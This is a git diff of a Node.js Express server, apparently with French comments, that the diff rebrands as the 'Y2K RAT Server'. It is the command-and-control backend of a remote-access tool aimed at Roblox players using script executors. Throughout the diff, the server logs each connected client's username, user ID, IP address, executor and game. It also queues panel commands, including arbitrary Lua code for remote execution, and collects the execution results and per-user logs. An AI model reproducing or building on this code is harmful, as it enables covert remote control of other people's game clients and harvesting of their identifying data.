@@ -38,161 +38,153 @@ function addLog(userid, type, action, details = {}) {
         logs.get(userid.toString()).pop();
     }
     
-    console.log(`📋 Log added for ${userid}: [${type}] ${action}`);
+    console.log(`📋 [LOG] ${userid}: [${type}] ${action}`);
 }
 
-// API pour obtenir les logs
-app.get('/logs/:userid', (req, res) => {
-    try {
-        const { userid } = req.params;
-        const userLogs = logs.get(userid.toString()) || [];
-        res.json(userLogs);
-    } catch (error) {
-        console.error('❌ Error in /logs:', error);
-        res.status(500).json([]);
-    }
-});
+// ========================================
+// API ENDPOINTS - Y2K RAT
+// ========================================
 
-// API pour obtenir l'historique du chat
-app.get('/chat/:userid', (req, res) => {
+// Endpoint principal pour l'enregistrement des joueurs
+app.post('/log', (req, res) => {
     try {
-        const { userid } = req.params;
-        const history = chatHistory.get(userid.toString()) || [];
-        res.json(history);
-    } catch (error) {
-        console.error('❌ Error in /chat:', error);
-        res.status(500).json([]);
-    }
-});
+        const { 
+            username, 
+            userid, 
+            accountAge, 
+            premium, 
+            game, 
+            placeId, 
+            jobId, 
+            platform, 
+            executor, 
+            timestamp, 
+            ip, 
+            status = 'online' 
+        } = req.body;
 
-// API pour obtenir les résultats d'exécution
-app.get('/exec-result/:userid', (req, res) => {
-    try {
-        const { userid } = req.params;
-        const result = executionResults.get(userid.toString());
-        if (result) {
-            executionResults.delete(userid.toString());
-            res.json(result);
-        } else {
-            res.json({ hasResult: false });
+        if (!userid) {
+            console.warn('⚠️ Missing userid in /log');
+            return res.status(400).json({ success: false, error: 'Missing userid' });
         }
+
+        const playerData = {
+            userid: userid.toString(),
+            username: username || 'Unknown',
+            accountAge: accountAge || '0',
+            premium: premium || false,
+            game: game || 'Unknown Game',
+            placeId: placeId || 'N/A',
+            jobId: jobId || 'N/A',
+            platform: platform || 'Unknown',
+            executor: executor || 'Unknown',
+            ip: ip || 'Hidden',
+            status: status,
+            lastSeen: Date.now(),
+            firstSeen: players.has(userid.toString()) 
+                ? players.get(userid.toString()).firstSeen 
+                : Date.now()
+        };
+
+        players.set(userid.toString(), playerData);
+        
+        addLog(userid, 'system', 'Client connected', {
+            username,
+            executor,
+            game,
+            ip
+        });
+        
+        console.log(`✅ [CONNECT] ${username} (${userid}) - ${executor}`);
+        res.json({ success: true, message: 'Player logged successfully' });
     } catch (error) {
-        console.error('❌ Error in /exec-result:', error);
-        res.status(500).json({ hasResult: false, error: error.message });
+        console.error('❌ Error in /log:', error);
+        res.status(500).json({ success: false, error: error.message });
     }
 });
 
-// API pour soumettre un résultat d'exécution (depuis le client Roblox)
-app.post('/exec-result', (req, res) => {
+// Endpoint pour le heartbeat (maintenir le statut online)
+app.post('/heartbeat', (req, res) => {
     try {
-        const { userid, success, result, error } = req.body;
-        
+        const { userid, status, timestamp } = req.body;
+
         if (!userid) {
             return res.status(400).json({ success: false, error: 'Missing userid' });
         }
 
-        executionResults.set(userid.toString(), {
-            success,
-            result: result || '',
-            error: error || '',
-            timestamp: Date.now()
-        });
+        const player = players.get(userid.toString());
+        if (player) {
+            player.lastSeen = Date.now();
+            player.status = status || 'online';
+            console.log(`💚 [HEARTBEAT] ${player.username} (${userid})`);
+        }
 
-        addLog(userid, 'exec', success ? 'Code executed successfully' : 'Code execution failed', {
-            success,
-            result: result ? result.substring(0, 100) : '',
-            error: error || ''
-        });
-
-        console.log(`📊 Execution result received from ${userid}:`, { success, hasResult: !!result });
         res.json({ success: true });
     } catch (error) {
-        console.error('❌ Error in /exec-result POST:', error);
+        console.error('❌ Error in /heartbeat:', error);
         res.status(500).json({ success: false, error: error.message });
     }
 });
 
-// API pour enregistrement et heartbeat
-app.post('/api', (req, res) => {
+// Endpoint pour récupérer les commandes (depuis le client Roblox)
+app.get('/commands/:userid', (req, res) => {
     try {
-        const { action, userid, username, executor, ip, game, gameId, jobId } = req.body;
-
-        if (!action || !userid) {
-            console.warn('⚠️ Missing required fields:', req.body);
-            return res.status(400).json({ success: false, error: 'Missing required fields' });
-        }
-
-        if (action === 'register') {
-            players.set(userid.toString(), {
-                userid,
-                username,
-                executor,
-                ip,
-                game,
-                gameId,
-                jobId,
-                lastSeen: Date.now(),
-                status: 'online'
-            });
-            
-            addLog(userid, 'system', 'Player connected', {
-                username,
-                executor,
-                game,
-                ip
-            });
-            
-            console.log(`✅ Player registered: ${username} (${userid})`);
-            return res.json({ success: true });
-        }
-
-        if (action === 'heartbeat') {
-            const player = players.get(userid.toString());
-            if (player) {
-                player.lastSeen = Date.now();
-                player.status = 'online';
-            }
-            return res.json({ success: true });
-        }
-
-        res.json({ success: false, error: 'Unknown action' });
-    } catch (error) {
-        console.error('❌ Error in /api POST:', error);
-        res.status(500).json({ success: false, error: error.message });
-    }
-});
-
-// API pour récupérer les commandes
-app.get('/api', (req, res) => {
-    try {
-        const { userid } = req.query;
+        const { userid } = req.params;
         
-        if (!userid) {
-            return res.json({ command: null });
-        }
-
         const command = commands.get(userid.toString());
         
         if (command) {
             commands.delete(userid.toString());
-            console.log(`📨 Command retrieved by ${userid}:`, command);
-            return res.json(command);
+            console.log(`📨 [COMMAND] Retrieved by ${userid}:`, command);
+            return res.json([command]);
         }
 
-        res.json({ command: null });
+        res.json([]);
     } catch (error) {
-        console.error('❌ Error in /api GET:', error);
-        res.status(500).json({ command: null, error: error.message });
+        console.error('❌ Error in /commands:', error);
+        res.status(500).json([]);
     }
 });
 
-// API pour envoyer des commandes depuis le panel
+// Endpoint pour obtenir la liste des joueurs
+app.get('/players', (req, res) => {
+    try {
+        const now = Date.now();
+        const playerList = Array.from(players.values()).map(player => ({
+            ...player,
+            status: (now - player.lastSeen < 15000) ? 'online' : 'offline'
+        }));
+        
+        res.json(playerList);
+    } catch (error) {
+        console.error('❌ Error in /players:', error);
+        res.status(500).json([]);
+    }
+});
+
+// Endpoint pour envoyer des commandes depuis le panel
 app.post('/command', (req, res) => {
     try {
-        const { userid, command, reason, assetId, speed, text, imageUrl, size, adminName, chatMessage, chatSender, luaCode, power, height } = req.body;
+        const { 
+            userid, 
+            command, 
+            reason, 
+            assetId, 
+            speed, 
+            text, 
+            imageUrl, 
+            size, 
+            adminName, 
+            chatMessage, 
+            chatSender, 
+            luaCode, 
+            power, 
+            height,
+            x, y, z
+        } = req.body;
 
-        if (!userid || (!command && !chatMessage)) {
-            return res.status(400).json({ error: 'Missing userid or command' });
+        if (!userid || (!command && !chatMessage && !luaCode)) {
+            return res.status(400).json({ error: 'Missing required fields' });
         }
 
         const commandData = {};
@@ -227,28 +219,22 @@ app.post('/command', (req, res) => {
             if (luaCode !== undefined) commandData.luaCode = luaCode;
             if (power !== undefined) commandData.power = power;
             if (height !== undefined) commandData.height = height;
+            if (x !== undefined) commandData.x = x;
+            if (y !== undefined) commandData.y = y;
+            if (z !== undefined) commandData.z = z;
             
-            const details = {};
-            if (reason) details.reason = reason;
-            if (assetId) details.assetId = assetId;
-            if (speed) details.speed = speed;
-            if (text) details.text = text.substring(0, 50);
-            if (imageUrl) details.imageUrl = imageUrl;
-            if (size) details.size = size;
-            if (adminName) details.adminName = adminName;
-            if (luaCode) details.luaCode = luaCode.substring(0, 50);
-            if (power) details.power = power;
-            if (height) details.height = height;
+            const details = { command };
+            if (luaCode) details.code = luaCode.substring(0, 50);
             
-            addLog(userid, 'command', `Command: ${command}`, details);
+            addLog(userid, 'command', `Command: ${command || 'exec'}`, details);
         }
 
         commands.set(userid.toString(), commandData);
-        console.log(`📤 Command/Chat queued for ${userid}:`, commandData);
+        console.log(`📤 [COMMAND] Queued for ${userid}:`, commandData);
 
         res.json({ 
             success: true, 
-            message: chatMessage ? 'Chat message sent' : `Command "${command}" queued for player ${userid}` 
+            message: chatMessage ? 'Chat sent' : `Command queued` 
         });
     } catch (error) {
         console.error('❌ Error in /command:', error);
@@ -256,31 +242,87 @@ app.post('/command', (req, res) => {
     }
 });
 
-// API pour obtenir la liste des joueurs
-app.get('/players', (req, res) => {
+// Endpoint pour obtenir les logs
+app.get('/logs/:userid', (req, res) => {
     try {
-        const now = Date.now();
-        const playerList = Array.from(players.values()).map(player => ({
-            ...player,
-            status: (now - player.lastSeen < 15000) ? 'online' : 'offline'
-        }));
-        res.json(playerList);
+        const { userid } = req.params;
+        const userLogs = logs.get(userid.toString()) || [];
+        res.json(userLogs);
     } catch (error) {
-        console.error('❌ Error in /players:', error);
+        console.error('❌ Error in /logs:', error);
         res.status(500).json([]);
     }
 });
 
-// API pour supprimer un joueur
+// Endpoint pour obtenir l'historique du chat
+app.get('/chat/:userid', (req, res) => {
+    try {
+        const { userid } = req.params;
+        const history = chatHistory.get(userid.toString()) || [];
+        res.json(history);
+    } catch (error) {
+        console.error('❌ Error in /chat:', error);
+        res.status(500).json([]);
+    }
+});
+
+// Endpoint pour obtenir les résultats d'exécution
+app.get('/exec-result/:userid', (req, res) => {
+    try {
+        const { userid } = req.params;
+        const result = executionResults.get(userid.toString());
+        if (result) {
+            executionResults.delete(userid.toString());
+            res.json(result);
+        } else {
+            res.json({ hasResult: false });
+        }
+    } catch (error) {
+        console.error('❌ Error in /exec-result:', error);
+        res.status(500).json({ hasResult: false, error: error.message });
+    }
+});
+
+// Endpoint pour soumettre un résultat d'exécution
+app.post('/exec-result', (req, res) => {
+    try {
+        const { userid, success, result, error } = req.body;
+        
+        if (!userid) {
+            return res.status(400).json({ success: false, error: 'Missing userid' });
+        }
+
+        executionResults.set(userid.toString(), {
+            success,
+            result: result || '',
+            error: error || '',
+            timestamp: Date.now()
+        });
+
+        addLog(userid, 'exec', success ? 'Code executed' : 'Execution failed', {
+            success,
+            result: result ? result.substring(0, 100) : '',
+            error: error || ''
+        });
+
+        console.log(`📊 [EXEC] Result from ${userid}:`, { success });
+        res.json({ success: true });
+    } catch (error) {
+        console.error('❌ Error in /exec-result POST:', error);
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+// Endpoint pour supprimer un joueur
 app.delete('/player/:userid', (req, res) => {
     try {
         const { userid } = req.params;
-        players.delete(userid);
-        commands.delete(userid);
-        chatHistory.delete(userid);
-        executionResults.delete(userid);
-        logs.delete(userid);
-        console.log(`🗑️ Player deleted: ${userid}`);
+        players.delete(userid.toString());
+        commands.delete(userid.toString());
+        chatHistory.delete(userid.toString());
+        executionResults.delete(userid.toString());
+        logs.delete(userid.toString());
+        console.log(`🗑️ [DELETE] Player ${userid} removed`);
         res.json({ success: true });
     } catch (error) {
         console.error('❌ Error in /player DELETE:', error);
@@ -291,22 +333,29 @@ app.delete('/player/:userid', (req, res) => {
 // Health check endpoint
 app.get('/health', (req, res) => {
     res.json({ 
-        status: 'ok', 
+        status: 'online',
+        name: 'Y2K RAT Server',
+        version: '1.0.0',
         players: players.size,
         commands: commands.size,
         uptime: process.uptime()
     });
 });
 
-// Nettoyage automatique des joueurs inactifs
+// Root endpoint
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
+// Nettoyage automatique des joueurs inactifs (60 secondes)
 setInterval(() => {
     const now = Date.now();
     let cleaned = 0;
     
     for (const [userid, player] of players.entries()) {
         if (now - player.lastSeen > 60000) {
-            console.log(`🔴 Player timeout: ${player.username}`);
-            addLog(userid, 'system', 'Player disconnected (timeout)', {
+            console.log(`🔴 [TIMEOUT] ${player.username} (${userid})`);
+            addLog(userid, 'system', 'Client disconnected (timeout)', {
                 username: player.username,
                 lastSeen: new Date(player.lastSeen).toISOString()
             });
@@ -319,11 +368,11 @@ setInterval(() => {
     }
     
     if (cleaned > 0) {
-        console.log(`🧹 Cleaned ${cleaned} inactive player(s)`);
+        console.log(`🧹 [CLEANUP] Removed ${cleaned} inactive client(s)`);
     }
 }, 30000);
 
-// Nettoyage des résultats d'exécution périmés (après 5 minutes)
+// Nettoyage des résultats d'exécution périmés
 setInterval(() => {
     const now = Date.now();
     for (const [userid, result] of executionResults.entries()) {
@@ -335,7 +384,7 @@ setInterval(() => {
 
 // Gestion des erreurs globales
 app.use((err, req, res, next) => {
-    console.error('❌ Global error handler:', err);
+    console.error('❌ [ERROR]', err);
     res.status(500).json({ 
         success: false, 
         error: 'Internal server error',
@@ -344,9 +393,13 @@ app.use((err, req, res, next) => {
 });
 
 // Démarrage du serveur
-app.listen(PORT, () => {
-    console.log(`🚀 1337 Panel Server running on port ${PORT}`);
+app.listen(PORT, '0.0.0.0', () => {
+    console.log('╔════════════════════════════════════════╗');
+    console.log('║         Y2K RAT SERVER v1.0           ║');
+    console.log('╚════════════════════════════════════════╝');
+    console.log(`🚀 Server running on port ${PORT}`);
     console.log(`📡 Local: http://localhost:${PORT}`);
     console.log(`🌐 Network: http://0.0.0.0:${PORT}`);
-    console.log(`✅ Server ready to accept connections`);
+    console.log(`✅ Ready to accept connections`);
+    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
 });
